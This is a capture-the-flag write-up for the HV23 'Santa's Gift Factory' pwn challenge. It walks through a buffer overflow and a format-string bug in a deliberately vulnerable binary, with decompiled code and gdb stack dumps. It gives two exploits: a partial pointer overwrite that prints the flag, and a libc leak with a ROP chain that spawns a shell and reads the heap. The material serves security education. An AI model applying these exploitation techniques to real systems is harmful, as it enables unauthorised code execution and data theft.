# 16 - Santa's Gift Factory

## Description

Level: Hard<br/>
Author: Fabi_07

Did you know that Santa has its own factory for making gifts? Maybe you can exploit it to get your own special gift!

## Solution

This was a typical pwn challenge. We are given a [ZIP file](santas-gift-factory.zip) that contains a Dockerfile as well
as a binary. Checking the security settings on the binary, we see:

```console
> pwn checksec vuln
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All security mechanisms are enabled except from stack canaries. Next, we take a look at the binary in Ghidra:

```c
void main() {
  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);
  setvbuf(stderr, 0, _IONBF, 0);
  printf("Santa's gift factory...");
  if (getchr("\nAre you willing to help him (y/n)? "); == 'y') {
    task();
  } else {
    error("I am sorry, but I am unable to help you any further.\n");
  }
}

void task() {
  srand(time(NULL));

  int red = 0;
  int yellow = 0;
  int blue = 0;

  puts("\nSanta: Great thanks for helping me.");
  puts("Santa: Can you count the different Presents and tell me how many of each i need?\n");

  for (int i = 0; i < 20; i++) {
    int random_value = rand();
    random_value %= 3;
    if (random_value == 0) {
        red++;
        puts(" - red");
    } else if (random_value == 1) {
        yellow++;
        puts(" - yellow");
    } else if (random_value == 2) {
        blue++;
        puts(" - blue");
    }
  }

  int answer_red = 0;
  int answer_yellow = 0;
  int answer_blue = 0;

  printf("\nSanta: How many red presents are needed?\n > ");
  scanf("%d%*c",&answer_red);

  printf("Santa: And how many yellow presents are needed?\n > ");
  scanf("%d%*c",&answer_yellow);

  printf("Santa: And how many blue presents are needed?\n > ");
  scanf("%d%*c",&answer_blue);

  if (red == answer_red && yellow == answer_yellow && blue == answer_blue) {
    puts("\nSanta: Well done, now you may get the flag.");
    tellflag();
  } else {
    puts("Santa: Sorry, but I think there has been a mistake. I\'m afraid I can\'t give you the flag just yet.\n");
  }
}

void tellflag() {
  FILE *flag = fopen("flag","r");
  if (flag == (FILE *)0x0) {
    error("Opening flag file failed!!! Please contact the admins.");
  }

  char flag_text [6];
  size_t read = fread(flag_text, 1, 5, flag);
  flag_text[read] = 0;

  if (fclose(flag) < 0) {
    error("Closing flag file failed!!! Please contact the admins.");
  }

  system("./magic.sh");

  char* name = getstr("Santa: One last thing, can you tell me your name?");
  printf("\nSanta: Let me see. Oh no, this is bad, the flag vanished before i could read it entirely . All I can give you is this: %s. I am very sorry about this and would like to apologise for the inconvenience.\n",flag_text);

  char anything_else [136];
  gets("\nSanta: Can I assist you with anything else?", anything_else);
  printf("\nSanta: You want me to help you with ");
  printf(anything_else);
  puts("?\nSanta: I will see what I can do...");
}
```

The code is quite straight-forward. First, we are asked to solve a simple puzzle and then `tellflag` is called.
The function first opens the `flag` file, reads it into a buffer and inserts a zero termination after the fifth
character. Then, `magic.sh` is called which deletes the `flag` file so that we cannot simply get a shell and read the
flag.

The two vulnerabilities in this binary are a buffer overflow as well as a format string vulnerability:

```c
char anything_else [136];
gets("\nSanta: Can I assist you with anything else?", anything_else); // buffer overflow
printf("\nSanta: You want me to help you with ");
printf(anything_else); // format string vulnerability
```

Note that the `gets` function is a custom implementation:

```c
char * gets(char *text,char *destination) {
  printf("%s\n > %s",text,"\x1b[?25h");
  char* line = (char*) 0x0;
  size_t size = 0;
  ssize_t read = getline(&line, &size, stdin);
  memcpy(destination,line,read - 1);
  return destination;
}
```

Since `magic.sh` deletes the `flag` file the content of `flag` needs to be buffered somewhere in memory. This is a bit
confusing since `fread` is supposed to only read 5 bytes, but it turns out that the `fread` implementation of libc reads
4096 bytes instead (can be verified using `strace`).

All we need a way to read memory either from stack or from the heap. At this point I came up with two solutions. The
first one is a simple, clean and unintended one and the second one is a bit messy and hacky but intended. I will
describe both solutions.

## Unintended solution

We have a buffer overflow as well as a format string vulnerability. What if I told you: we can manipulate a pointer on
the stack through the buffer overflow, as well as print that particular pointer with just one input? That's exactly
what we can do here. We start by generating a template via `pwn template` and solving the puzzle. We then attach `gdb`
and check the stack right before the last `printf`:

```console
0x00005641a15565ca <+254>:   lea    rax,[rbp-0xa0]
0x00005641a15565d1 <+261>:   mov    rdi,rax
0x00005641a15565d4 <+264>:   mov    eax,0x0
0x00005641a15565d9 <+269>:   call   0x5641a1556180 <printf@plt>

> break *tellflag+269
> c
> stack 50

00:0000│ rsp 0x7fff328dd0f0 ◂— 0xa68 /* 'h\n' */
01:0008│-0a8 0x7fff328dd0f8 ◂— 0x7b33325648bf70
02:0010│ rdi 0x7fff328dd100 ◂— 0x41 /* 'A' */
03:0018│-098 0x7fff328dd108 ◂— 0x1
04:0020│-090 0x7fff328dd110 ◂— 0xa /* '\n' */
05:0028│-088 0x7fff328dd118 —▸ 0x7fcbae941780 (_IO_2_1_stdout_) ◂— 0xfbad2887
06:0030│-080 0x7fff328dd120 —▸ 0x5641a1559020 (stdout@GLIBC_2.2.5) —▸ 0x7fcbae941780 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-078 0x7fff328dd128 —▸ 0x7fcbae93d600 (_IO_file_jumps) ◂— 0x0
08:0040│-070 0x7fff328dd130 —▸ 0x7fcbae99b000 (_rtld_global) —▸ 0x7fcbae99c2d0 —▸ 0x5641a1555000 ◂— 0x10102464c457f
09:0048│-068 0x7fff328dd138 —▸ 0x7fcbae7edbc9 (_IO_do_write+25) ◂— cmp rbx, rax
0a:0050│-060 0x7fff328dd140 —▸ 0x7fcbae941780 (_IO_2_1_stdout_) ◂— 0xfbad2887
0b:0058│-058 0x7fff328dd148 —▸ 0x7fcbae7ee053 (_IO_file_overflow+259) ◂— cmp eax, -1
0c:0060│-050 0x7fff328dd150 ◂— 0x2c /* ',' */
0d:0068│-048 0x7fff328dd158 —▸ 0x5641a1557378 ◂— '\nSanta: Well done, now you may get the flag.'
0e:0070│-040 0x7fff328dd160 —▸ 0x7fcbae941780 (_IO_2_1_stdout_) ◂— 0xfbad2887
0f:0078│-038 0x7fff328dd168 —▸ 0x7fcbae7e2cfa (puts+506) ◂— cmp eax, -1
10:0080│-030 0x7fff328dd170 —▸ 0x7fff328dd318 —▸ 0x7fff328de2b3 ◂— 'COLORFGBG=15;0'
11:0088│-028 0x7fff328dd178 —▸ 0x7fcbae7add14 (random+52) ◂— xor eax, eax
12:0090│-020 0x7fff328dd180 —▸ 0x7fff328dd308 —▸ 0x7fff328de294 ◂— '/home/kali/Downloads/hv16/vuln'
13:0098│-018 0x7fff328dd188 —▸ 0x5641a30e2480 ◂— 0x6b61667b33320000
14:00a0│-010 0x7fff328dd190 ◂— 0x500000000
15:00a8│-008 0x7fff328dd198 —▸ 0x5641a30e22a0 ◂— 0x5641a30e2
...
```

Near the bottom of the stack (higher addresses) we can see a pointer to the heap `0x5641a30e2480` (the color of the
address reveals the fact that it points to the heap). Looking at the content on the heap:

```console
> x/10s 0x5641a30e2480

0x5641a30e2480: ""
0x5641a30e2481: ""
0x5641a30e2482: "23{fake_flag}\n"
0x5641a30e2491: ""
0x5641a30e2492: ""
```

Seems like we simply need to change the `80` to `82` to be able to influence the pointer. Luckily, our buffer overflow
does not append any special characters. To find the correct offset, we can send a cyclic string and then observe what
was written at offset 13 onto the stack:

```python
io.recvuntil(b"else?")
io.sendline(cyclic(400))
```

```
> stack 50

pwndbg> stack 50
00:0000│ rsp 0x7ffe483076d0 ◂— 0xa68 /* 'h\n' */
01:0008│-0a8 0x7ffe483076d8 ◂— 0x7b333256486f70 /* 'poHV23{' */
02:0010│ rdi 0x7ffe483076e0 ◂— 0x6161616261616161 ('aaaabaaa')
03:0018│-098 0x7ffe483076e8 ◂— 0x6161616461616163 ('caaadaaa')
04:0020│-090 0x7ffe483076f0 ◂— 0x6161616661616165 ('eaaafaaa')
05:0028│-088 0x7ffe483076f8 ◂— 0x6161616861616167 ('gaaahaaa')
06:0030│-080 0x7ffe48307700 ◂— 0x6161616a61616169 ('iaaajaaa')
07:0038│-078 0x7ffe48307708 ◂— 0x6161616c6161616b ('kaaalaaa')
08:0040│-070 0x7ffe48307710 ◂— 0x6161616e6161616d ('maaanaaa')
09:0048│-068 0x7ffe48307718 ◂— 0x616161706161616f ('oaaapaaa')
0a:0050│-060 0x7ffe48307720 ◂— 0x6161617261616171 ('qaaaraaa')
0b:0058│-058 0x7ffe48307728 ◂— 0x6161617461616173 ('saaataaa')
0c:0060│-050 0x7ffe48307730 ◂— 0x6161617661616175 ('uaaavaaa')
0d:0068│-048 0x7ffe48307738 ◂— 0x6161617861616177 ('waaaxaaa')
0e:0070│-040 0x7ffe48307740 ◂— 0x6261617a61616179 ('yaaazaab')
0f:0078│-038 0x7ffe48307748 ◂— 0x6261616362616162 ('baabcaab')
10:0080│-030 0x7ffe48307750 ◂— 0x6261616562616164 ('daabeaab')
11:0088│-028 0x7ffe48307758 ◂— 0x6261616762616166 ('faabgaab')
12:0090│-020 0x7ffe48307760 ◂— 0x6261616962616168 ('haabiaab')
13:0098│-018 0x7ffe48307768 ◂— 0x6261616b6261616a ('jaabkaab')
```

Now we can use this string to find the correct offset:

```python
cyclic_find(b'jaabkaab') # 136
```

Perfect, now we just need the right offset to print the string. We can figure out the right one by just trying a few:

```python
for i in range(50):
    try:
        io = process([exe.path])
        ...
        io.recvuntil(b"else?")
        io.sendline(b'%' + str(i).encode() + b'$p')
        print(i, io.recvline())
        io.close()
    except:
        pass
```

from which we get the right offset `25` at which we can see `XXXXXXXXX480`:

```
0 b'Santa: You want me to help you with %0$p?\n'
1 b'Santa: You want me to help you with 0x7ffd69f0c2a0?\n'
2 b'Santa: You want me to help you with (nil)?\n'
3 b'Santa: You want me to help you with (nil)?\n'
4 b'Santa: You want me to help you with 0x78?\n'
5 b'Santa: You want me to help you with 0x80?\n'
6 b'Santa: You want me to help you with 0xa68?\n'
7 b'Santa: You want me to help you with 0x7b33325648ef70?\n'
8 b'Santa: You want me to help you with 0x70243825?\n'
9 b'Santa: You want me to help you with 0x1?\n'
10 b'Santa: You want me to help you with 0xa?\n'
11 b'Santa: You want me to help you with 0x7f98be1b2780?\n'
12 b'Santa: You want me to help you with 0x556dbbf5c020?\n'
13 b'Santa: You want me to help you with 0x7f7fa531c600?\n'
14 b'Santa: You want me to help you with 0x7f526af10000?\n'
15 b'Santa: You want me to help you with 0x7f17863b5bc9?\n'
16 b'Santa: You want me to help you with 0x7f705c48d780?\n'
17 b'Santa: You want me to help you with 0x7f28a1559053?\n'
18 b'Santa: You want me to help you with 0x2c?\n'
19 b'Santa: You want me to help you with 0x565253965378?\n'
20 b'Santa: You want me to help you with 0x7fdbd3d2a780?\n'
21 b'Santa: You want me to help you with 0x7f9227980cfa?\n'
22 b'Santa: You want me to help you with 0x7fffc7b78248?\n'
23 b'Santa: You want me to help you with 0x7f265243cd14?\n'
24 b'Santa: You want me to help you with 0x7ffe606647b8?\n'
25 b'Santa: You want me to help you with 0x564072241 480?\n'
```

The final exploit now looks like this:

```python
payload = fit({0: b'%25$s', 136: b'\x84'})
io.sendline(payload)
```

This works by:

- First, overwriting the pointer from `480` to `482` which is the content of the flag.
- Printing the 25th variable on the stack which is this exact pointer.

The full unintended exploit can be found in [exploit_unintended.py](exploit_unintended.py).

## Intended solution

For this solution, we first leak a libc address via the string format vulnerability and jump back into `tellflag` using
the buffer overflow:

```python
io.recvuntil(b"else?")

payload = flat({0: b'%p' * 50, 167: chr(0x9b).encode()})  # jump back into task
io.sendline(payload)

leak = str(io.recvline()).split('0x')
leak_task = int(leak[27], 16)
leak_libc = int(leak[37].replace('(nil)', ''), 16)

exe.address = leak_task - (exe.sym['task'] + 427)
libc.address = leak_libc - libc.sym['__libc_start_main'] + 0x30
```

With this we have defeated ASLR. The exact offsets that I used above can be found using GDB. Next, we get a remote
shell:

```python
rop = ROP(libc)
ret = rop.find_gadget(['ret'])

rop.raw(ret)
binsh = next(libc.search(b'/bin/sh\x00'))
rop.system(binsh)

rop.raw(ret)
rop.raw(ret)
rop.raw(ret)
rop.call(exe.sym['tellflag'])
```

With this we get a remote shell but keep in mind that the `flag` file has already been deleted at this point. Instead,
we take a peek at `/proc/<pid>/maps` to identify the base of the heap:

```python
io.sendline(b"PID=$(ps -ef | grep -e vuln | grep -v grep | grep -v socat | tr -s ' ' | cut -d ' ' -f2)")
io.sendline(b"echo ${PID}")
io.sendline(b"cat /proc/${PID}/maps | grep heap")
io.sendline(b"exit")
```

All we have to do now, is to calculate the address on the heap that contains the actual flag content (the offset is
always the same):

```python
heap_addr = io.recvline().decode()
heap_addr = int(heap_addr.split('-')[0], 16)
heap_addr = heap_addr + 0x485
```

And now we can finally print the flag file content:

```python
rop = ROP(libc)
rop.raw(ret)
rop.puts(heap_addr)
```

The complete intended solution can be found in [exploit_intended.py](exploit_intended.py) and the flag
was `HV23{roses_are_red_violets_are_blue_the_bufferoverfl0w_is_0n_line_32}`.
